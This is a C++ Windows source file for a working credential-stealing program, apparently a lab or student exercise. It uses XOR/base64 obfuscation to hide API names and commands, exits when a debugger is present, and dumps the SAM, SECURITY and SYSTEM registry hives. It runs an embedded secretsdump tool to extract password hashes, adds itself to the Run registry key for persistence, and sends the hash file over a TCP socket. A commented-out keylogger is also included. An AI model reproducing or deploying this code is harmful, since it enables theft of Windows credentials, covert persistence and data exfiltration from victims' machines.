// main.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#define __STDC_WANT_LIB_EXT1__ 1

#include <direct.h>
#include <io.h>
#include <cstring>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <cstdlib>
#include <string>
#include <tchar.h>
#include "resource.h"
#include <fstream>
#include <atlstr.h>
#include "base64.h"
#include "encrypt.h"

// Link with ws2_32.lib
#pragma comment(lib, "Ws2_32.lib")


#define HOST_NAME "localhost"
#define PORT_NUMBER "50000" // should fail because no server-side code is listening
#define FILE_NAME "hash.txt"
#define BUFFER_SIZE 512

using namespace std;


//Define messageboxW 
typedef int(_stdcall* Msg) (HWND, LPCWSTR, LPCWSTR, UINT);
//Define ShellExecuteW 
typedef HINSTANCE(_stdcall* Shell) (HWND,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,INT);
//Define GetModuleFileNameW
typedef DWORD (_stdcall* ModuleFile)(HMODULE,LPWSTR,DWORD );
//Define CopyFile
typedef BOOL (_stdcall* Copying)(LPCTSTR,LPCTSTR,BOOL);
//Define IsDebuggerPresent
typedef BOOL (_stdcall* LocalDebugger)();
//Define CheckRemoteDebuggerPresent
typedef BOOL (_stdcall* RemoteDebugger)(HANDLE,PBOOL);
//Define GetModuleHandleW
typedef HMODULE (_stdcall* ModuleHandle)(LPCWSTR );
//Define RegOpenKeyExW
typedef LSTATUS (_stdcall* OpenRegKey)(HKEY,LPCWSTR,DWORD,REGSAM,PHKEY);
//Define RegSetValueExW
typedef LSTATUS (_stdcall* SetRegValue)(HKEY,LPCWSTR,DWORD,DWORD,const BYTE* ,DWORD);
//Define  GetTempPathW
typedef DWORD (_stdcall* TempPath) ( DWORD,LPWSTR );
//Define CreateFileW
typedef HANDLE (_stdcall* NewFile)(	LPCWSTR,DWORD ,	DWORD,LPSECURITY_ATTRIBUTES,DWORD,	DWORD,	HANDLE);
//Define CreateProcessW
typedef BOOL (_stdcall* NewProcess)(LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES ,LPSECURITY_ATTRIBUTES ,BOOL,DWORD,LPVOID,	LPCWSTR,LPSTARTUPINFOW,	LPPROCESS_INFORMATION );
//Define FindResourceW
typedef HRSRC (_stdcall* LocateResource)(HMODULE,LPCWSTR,LPCWSTR);
//Define LoadResource
typedef HGLOBAL (_stdcall* LoadingResource)(HMODULE ,HRSRC);
//Define LockResource
typedef LPVOID (_stdcall* LockingResource)(HGLOBAL);
//Define GetSizeOfResource
typedef DWORD (_stdcall* GetSizeofResource)(HMODULE,HRSRC);


HINSTANCE LLibrary(LPCWSTR dllToLoad);
void DumpSam();
string XorEncoding(string input);
wstring XorDecoding(string input);
void CopyExe();
void AddToRegistry(LPCTSTR data);
void ExtractResource();
string ReturnTempPath(string name);
BOOL ExecuteDump();
void BeingDebbuged();
void ExfiltrateSecret();
//int Save(int _key, char *file);
//void Keylogger();


int main(int argc, char* argv[])
{ 	

	BeingDebbuged();
	ExtractResource();
	DumpSam();
	ExecuteDump();
	CopyExe();
	ExfiltrateSecret();



	return 0;
	
}

//Function to dump the three registries to file; sam, security and system
void DumpSam() {

	//Load shell32.dll
	//CzA9NDRranY8NDQ= : shell32.dll
	HINSTANCE shellDll = LLibrary(XorDecoding("CzA9NDRranY8NDQ=").c_str());
	//CzA9NDQdID07LSw9Dw== : ShellExecuteW
	wstring shellEncoded = XorDecoding("CzA9NDQdID07LSw9Dw==");
	string shellTmp(shellEncoded.begin(), shellEncoded.end());
	Shell ShellExec = (Shell)GetProcAddress(shellDll, shellTmp.c_str());


	//Save the sam registry
	wstring samDecoded = XorDecoding("dxt4Kj0/eCs5Lj14MDM0NQQrOTV4fQwdFQh9BCs5NXYrOS49");
	HINSTANCE samReg = ShellExec(NULL, L"open", L"cmd.exe", samDecoded.c_str(), NULL, SW_HIDE);

	//Check if value returned is greater than 32
	if (!((int)samReg > 32)) {
		printf("Error dumping sam registry.\n");
	}


	//Save the security registry
	wstring securityDecoded = XorDecoding("dxt4Kj0/eCs5Lj14MDM0NQQrPTstKjEsIXh9DB0VCH0EKz07LSoxLCF2KzkuPQ==");
	HINSTANCE securityReg = ShellExec(NULL, L"open", L"cmd.exe", securityDecoded.c_str(), NULL, SW_HIDE);

	if (!((int)securityReg > 32)) {
		printf("Error dumping security registry.\n");
	}

	//Save the system registry
	wstring systemDecoded = XorDecoding("dxt4Kj0/eCs5Lj14MDM0NQQrISssPTV4fQwdFQh9BCshKyw9NXYrOS49");
	HINSTANCE systemReg = ShellExec(NULL, L"open", L"cmd.exe",systemDecoded.c_str() , NULL, SW_HIDE);

	if (!((int)systemReg > 32)) {
		printf("Error dumping system registry.\n");
	}
}

//Function to load library
HINSTANCE LLibrary(LPCWSTR dllToLoad) {

	HINSTANCE hDll = LoadLibrary(dllToLoad);

	if (hDll == NULL) {
		wprintf(L"Error getting handle to: %s\n", dllToLoad);
		exit(-1);
	}
	
	return hDll;
}

//Function to encode/decode text
string XorEncoding(string input) {
	char cipher = 'X';
	for (int i = 0; i < input.size(); i++)
	{
		input[i] = input[i] ^ cipher;
	}

	string encoded = base64_encode(reinterpret_cast<const unsigned char*>(input.c_str()), input.length());

	return encoded;
}


wstring XorDecoding(string input) {
	char cipher = 'X';
	string decoded = base64_decode(input);


	for (int i = 0; i < decoded.size(); i++)
	{
		decoded[i] = decoded[i] ^ cipher;
	}

	wstring ret(decoded.begin(), decoded.end());
	return ret;

}

//Function to copy the current exe to Crypto folder
void CopyExe() {

	//Ez0qNj00a2p2PDQ0 : kernel32.dll
	HINSTANCE kernelDll = LLibrary(XorDecoding("Ez0qNj00a2p2PDQ0").c_str());

	//Hz0sFTc8LTQ9HjE0PRY5NT0P : getmodulefilenamew
	wstring fileNameEncoded = XorDecoding("Hz0sFTc8LTQ9HjE0PRY5NT0P");
	string fileNameTmp(fileNameEncoded.begin(), fileNameEncoded.end());
	ModuleFile ModuleFileName = (ModuleFile)GetProcAddress(kernelDll, fileNameTmp.c_str());

	//GzcoIR4xND0= : CopyFile
	wstring copyFileEncoded = XorDecoding("GzcoIR4xND0=");
	string copyFileTmp(copyFileEncoded.begin(), copyFileEncoded.end());
	Copying CopyingFile = (Copying)GetProcAddress(kernelDll, copyFileTmp.c_str());

	wchar_t charArray[MAX_PATH];
	//Get the full path to the exe
	ModuleFileName(NULL, charArray, MAX_PATH);

	wstring path = XorDecoding("G2IECCo3Pyo5NRw5LDkEFTE7KjcrNz4sBBsqISgsNwQ7KiEoLDd2PSA9");
	//Copy the exe to the path
	CopyFile(charArray, path.c_str(), FALSE);


	AddToRegistry(path.c_str());
}


//Function to set value under the register key CurrentVersion\Run (enable autorun on startup)
void AddToRegistry(LPCTSTR data) {
	
	HKEY hKey;
	//GTwuOSgxa2p2PDQ0 : advapi32.dll
	HINSTANCE advapiDll = LLibrary(XorDecoding("GTwuOSgxa2p2PDQ0").c_str());

	//Cj0/Fyg9NhM9IR0gDw== : regopenkeyw
	wstring regOpenEncoded = XorDecoding("Cj0/Fyg9NhM9IR0gDw==");
	string regOpenTmp(regOpenEncoded.begin(), regOpenEncoded.end());
	OpenRegKey regOpen = (OpenRegKey)GetProcAddress(advapiDll, regOpenTmp.c_str());

	//Cj0/Cz0sDjk0LT0dIA8= : regsetvaluew
	wstring regSetEncoded = XorDecoding("Cj0/Cz0sDjk0LT0dIA8=");
	string regSetTmp(regSetEncoded.begin(), regSetEncoded.end());
	SetRegValue setKey = (SetRegValue)GetProcAddress(advapiDll, regSetTmp.c_str());
	
	//Open the CurrentVersion\Run key 
	wstring keyTmp = XorDecoding("CxceDA8ZCh0EDxcPbmxrahY3PD0EFTE7KjcrNz4sBA8xNjw3LysEGy0qKj02LA49KisxNzYECi02");
	if (regOpen(HKEY_LOCAL_MACHINE, keyTmp.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
		//Write the value and data to the opened key
		LSTATUS ret=setKey(hKey, L"crypto", 0, REG_SZ, (LPBYTE)data, _tcslen(data) *sizeof(TCHAR));
		if (ret==ERROR_SUCCESS)
		{
			printf("Good adding");

		}
		else
		{
			printf("Failed to set registry key.\n");
		}
		RegCloseKey(hKey);
	}
	else {
		printf("Failed to open registry key.\n");
	}

}

//Function to extract secretdump.exe out of resource
void ExtractResource() {

	//Ez0qNj00a2p2PDQ0
	HINSTANCE kernelDll = LLibrary(XorDecoding("Ez0qNj00a2p2PDQ0").c_str());

	//Hz0sFTc8LTQ9EDk2PDQ9Dw== : getmodulehandlew
	wstring moduleHandleEncoded = XorDecoding("Hz0sFTc8LTQ9EDk2PDQ9Dw==");
	string moduleHandleTmp(moduleHandleEncoded.begin(), moduleHandleEncoded.end());
	ModuleHandle getModuleHandle = (ModuleHandle)GetProcAddress(kernelDll, moduleHandleTmp.c_str());

	//HjE2PAo9KzctKjs9Dw==
	wstring findResourceEncoded = XorDecoding("HjE2PAo9KzctKjs9Dw==");
	string findResourceTmp(findResourceEncoded.begin(), findResourceEncoded.end());
	LocateResource findResource = (LocateResource)GetProcAddress(kernelDll, findResourceTmp.c_str());

	//FDc5PAo9KzctKjs9 : loadresource
	wstring loadResourceEncoded = XorDecoding("FDc5PAo9KzctKjs9");
	string loadResourceTmp(loadResourceEncoded.begin(), loadResourceEncoded.end());
	LoadingResource loadResource = (LoadingResource)GetProcAddress(kernelDll, loadResourceTmp.c_str());

	//FDc7Mwo9KzctKjs9 : lockresource
	wstring lockResourceEncoded = XorDecoding("FDc7Mwo9KzctKjs9");
	string lockResourceTmp(lockResourceEncoded.begin(), lockResourceEncoded.end());
	LockingResource lockResource = (LockingResource)GetProcAddress(kernelDll, lockResourceTmp.c_str());

	//CzEiPTc+Cj0rNy0qOz0= : sizeofresource
	wstring sizeEncoded = XorDecoding("CzEiPTc+Cj0rNy0qOz0=");
	string sizeTmp(sizeEncoded.begin(), sizeEncoded.end());
	GetSizeofResource rsrcSize = (GetSizeofResource)GetProcAddress(kernelDll, sizeTmp.c_str());

	//Get the handle to the current process
	HMODULE hModule = getModuleHandle(NULL);
	//Find the secretdump.exe resource
	HRSRC ret = findResource(hModule, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	//Load the resource
	HGLOBAL res = loadResource(hModule, ret);
	//Get lock to resource
	LPVOID lock = lockResource(res);
	//Get the size of the exe
	DWORD size = rsrcSize(hModule, ret);

	string path = ReturnTempPath("dump.exe");

	//Open output stream to file
	std::ofstream outputFile(path.c_str(), std::ios::binary);
	//Write the resource file 
	outputFile.write((const char*)lock, size);
	//Close the dile
	outputFile.close();
}


//Function to Check if a debugger is attached to this process 
//If a debugger is detected it will delete itself
void BeingDebbuged() {
	//Ez0qNj00a2p2PDQ0 : kernel32.dll
	HINSTANCE Kerneldll = LLibrary(XorDecoding("Ez0qNj00a2p2PDQ0").c_str());

	//ESscPTotPz89KggqPSs9Niw= : isdebuggerpresent
	wstring debuggerPresentEncoded = XorDecoding("ESscPTotPz89KggqPSs9Niw=");
	string debuggerPresentTmp(debuggerPresentEncoded.begin(), debuggerPresentEncoded.end());
	LocalDebugger checkLocalDebugger = (LocalDebugger)GetProcAddress(Kerneldll, debuggerPresentTmp.c_str());

	//GzA9OzMKPTU3LD0cPTotPz89KggqPSs9Niw= : checkremotedebuggerpresent
	wstring remoteDebuggerEncoded = XorDecoding("GzA9OzMKPTU3LD0cPTotPz89KggqPSs9Niw=");
	string remoteDebuggerTmp(remoteDebuggerEncoded.begin(), remoteDebuggerEncoded.end());
	RemoteDebugger  checkRemoteDebugger = (RemoteDebugger)GetProcAddress(Kerneldll, remoteDebuggerTmp.c_str());

	//Hz0sFTc8LTQ9EDk2PDQ9Dw== : GetModuleHandleW
	wstring moduleHandleEncoded = XorDecoding("Hz0sFTc8LTQ9EDk2PDQ9Dw==");
	string moduleHandleTmp(moduleHandleEncoded.begin(), moduleHandleEncoded.end());
	ModuleHandle getHandle = (ModuleHandle)GetProcAddress(Kerneldll, moduleHandleTmp.c_str());

	HANDLE hProcess = getHandle(NULL);
	PBOOL pbDebuggerPresent=FALSE;

	checkRemoteDebugger(hProcess, pbDebuggerPresent);
	//If the program is being debugged it returns true; else false
	if ((checkLocalDebugger() != 0)|| (pbDebuggerPresent)) {
		exit(1);
	}

}


//TODO: Delete file if in debugger
//Function to delete the exe
//https://stackoverflow.com/questions/3457040/how-to-write-a-program-in-c-such-that-it-will-delete-itself-after-execution
/*
void DeleteExe()
{
	HINSTANCE shellDll = LLibrary(TEXT("Shell32.dll"));

	Shell ShellExec = (Shell)GetProcAddress(shellDll, "ShellExecuteW");

	HINSTANCE kernelDll = LLibrary(TEXT("Kernel32.dll"));
	ModuleFile ModuleFileName = (ModuleFile)GetProcAddress(kernelDll, "GetModuleFileNameW");


	wchar_t szModuleName[MAX_PATH];
	ModuleFileName(NULL, szModuleName, MAX_PATH);

	wstring x =szModuleName;
	wstring c = L"/C del " + x;

	HINSTANCE delFile = ShellExec(NULL, L"open", L"cmd.exe", szModuleName, NULL, SW_HIDE);
	DWORD err = GetLastError();
	wcout << delFile;
	wcout << err;
}
*/



//Function that will append the temp dir with the given filename
string ReturnTempPath(string name) {
	//Ez0qNj00a2p2PDQ0  : kernel32.dll
	HINSTANCE kernellDll = LLibrary(XorDecoding("Ez0qNj00a2p2PDQ0").c_str());

	//Hz0sDD01KAg5LDAP : GetTempPathW
	wstring tempPathEncoded = XorDecoding("Hz0sDD01KAg5LDAP");
	string tempPathTmp(tempPathEncoded.begin(), tempPathEncoded.end());
	TempPath getTemp = (TempPath)GetProcAddress(kernellDll, tempPathTmp.c_str());


	//Get the temp path for the computer
	wchar_t czTempPath[MAX_PATH] = { 0 };
	getTemp(MAX_PATH, czTempPath); // retrieving temp path

	wstring path = czTempPath;

	//blog.mijalko.com/2008/06/convert-stdstring-to-stdwstring.html
	//Convert string to wstring
	wstring tempName;
	tempName.assign(name.begin(), name.end());

	//The name of the new exe
	path += tempName;

	//Convert wstring to string
	string tempFinal;
	tempFinal.assign(path.begin(), path.end());

	return tempFinal;

}


//Function that will execute the dump.exe(secretsdump.exe)
BOOL ExecuteDump() {
	//Ez0qNj00a2p2PDQ0  : kernel32.dll
	HINSTANCE kernelDll = LLibrary(XorDecoding("Ez0qNj00a2p2PDQ0").c_str());

	//Gyo9OSw9HjE0PQ8= : CreateFileW
	wstring createFileEncoded = XorDecoding("Gyo9OSw9HjE0PQ8=");
	string createFileTmp(createFileEncoded.begin(), createFileEncoded.end());
	NewFile createNewFile = (NewFile)GetProcAddress(kernelDll, createFileTmp.c_str());

	//Gyo9OSw9CCo3Oz0rKw8= : CreateProcessW
	wstring createProcessEncoded = XorDecoding("Gyo9OSw9CCo3Oz0rKw8=");
	string createProcessTmp(createProcessEncoded.begin(), createProcessEncoded.end());
	NewProcess createNewProcess = (NewProcess)GetProcAddress(kernelDll, createProcessTmp.c_str());

	//Get the path relative to temp directory
	string exePath = ReturnTempPath("dump.exe");
	string samPath = ReturnTempPath("sam.save");
	string securityPath = ReturnTempPath("security.save");
	string systemPath = ReturnTempPath("system.save");
	string filePath = ReturnTempPath("hash.txt");
	string finalPath = exePath + " -sam " + samPath + " -security " + securityPath + " -system " + systemPath + " LOCAL ";
	
	//Convert file and final path from string to tchar
	TCHAR sFilePath[MAX_PATH];
	_tcscpy_s(sFilePath, CA2T(filePath.c_str()));

	TCHAR sFinalPath[MAX_PATH];
	_tcscpy_s(sFinalPath, CA2T(finalPath.c_str()));

	//Initialise security attributes
	SECURITY_ATTRIBUTES sa;
	sa.nLength = MAX_PATH;
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;


	//Create a file and get handle
	HANDLE hFile = createNewFile(sFilePath, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, &sa, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	// Initialise variables
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	BOOL ret = FALSE;
	DWORD flags = CREATE_NO_WINDOW;

	// Write the blocks of memory to zero
	SecureZeroMemory(&pi, sizeof(pi));
	SecureZeroMemory(&si, sizeof(si));

	//Initialise the startupinfo struct
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags |= STARTF_USESTDHANDLES;
	si.hStdInput = NULL;
	si.hStdOutput = hFile;
	si.hStdError = hFile;

	//Create(run) the process
	ret = createNewProcess(NULL, sFinalPath, NULL, NULL, TRUE, flags, NULL, NULL, &si, &pi);

	//If success, quit the process after exit
	if (ret) {
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return 0;
	}
	return -1;
}

//Function to smuggle the dumped secrets to remote server
void ExfiltrateSecret() {

	//----------------------------------------------
	// declare variables

	WSADATA wsaData;
	struct addrinfo hints, * res;
	int stat, sockfd;
	FILE* fd;
	errno_t error;

	//buffer to read
	char buffer[BUFFER_SIZE];

	//----------------------------------------------
	// initialization

	// Initialize winsock
	stat = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (stat != NO_ERROR)
	{
		printf("WSAStartup failure: %d (No usable Winsock DLL)\n", stat);
		scanf_s(" ");
		// do alt action or exit
		exit(-1);
	}

	// Setup the hints address info structure
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET; // IPv4
	hints.ai_socktype = SOCK_STREAM; // TCP-based
	hints.ai_protocol = IPPROTO_TCP; // TCP protocol

	// Protocol-independent translation from an ANSI host name to IP address
	stat = 0;
	if ((stat = getaddrinfo(HOST_NAME, PORT_NUMBER, &hints, &res)) != 0)
	{
		printf("getaddrinfo failed: %s\n", gai_strerror(stat));
		// do alt action or exit
		WSACleanup();
		scanf_s(" ");
		exit(-1);
	}

	// Initialize socket
	sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
	if (sockfd == INVALID_SOCKET)
		printf("Failed to init socket : %d\n", WSAGetLastError());

	// Establish connection
	if (connect(sockfd, res->ai_addr, res->ai_addrlen) == SOCKET_ERROR)
	{
		printf("connection failed : %ld\n", WSAGetLastError());
		scanf_s(" ");
		// do alt action or exit
		WSACleanup();
		exit(-1);
	}

	//----------------------------------------------
	// send file to server

	error = fopen_s(&fd, FILE_NAME, "r+");
	int bytes_read;
	if (error != 0)
	{
		printf("error opening file under ");

		// Get the current working directory:
		char* buf;
		if ((buf = _getcwd(NULL, 0)) != NULL)
		{
			printf("%s \n", buf);
			free(buf);
		}
		scanf_s(" ");
		// do alt action or exit
		WSACleanup();
		fclose(fd);
		exit(-1);
	}
	else
	{
		while (!feof(fd))
		{
			if ((bytes_read = fread(&buffer, 1, BUFFER_SIZE, fd)) > 0)
				send(sockfd, buffer, bytes_read, 0);
			else
				break;
		}
	}

	stat = fclose(fd);
	if (stat != 0)
	{
		printf("Error closing file descriptor. \n");
		scanf_s(" ");
		// do alt action or exit
		WSACleanup();
		exit(-1);
	}

	//----------------------------------------------
	// close up

	if (closesocket(sockfd) == SOCKET_ERROR)
	{
		printf("Socket cannot be closed : %d\n", WSAGetLastError());
		scanf_s(" ");
		// do alt action or exit
		WSACleanup();
		exit(-1);
	}

	freeaddrinfo(res);
	WSACleanup();
}

/*
void Keylogger() {
	FreeConsole();

	char fileName[] = "log.txt";

	char i;

	while (true) {
		Sleep(10);
		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				Save(i, fileName);
			}
		}
	}

}

int Save(int _key, char *file) {

	cout << _key << endl;

	Sleep(10);

	FILE *OUTPUT_FILE;

	OUTPUT_FILE = fopen(file, "a+");

	if (_key == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (_key == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", "[BACK]");
	else if (_key == VK_LBUTTON)
		fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
	else if (_key == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s", "[RETURN]");
	else if (_key == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else
		fprintf(OUTPUT_FILE, "%s", &_key);

	fclose(OUTPUT_FILE);

}
*/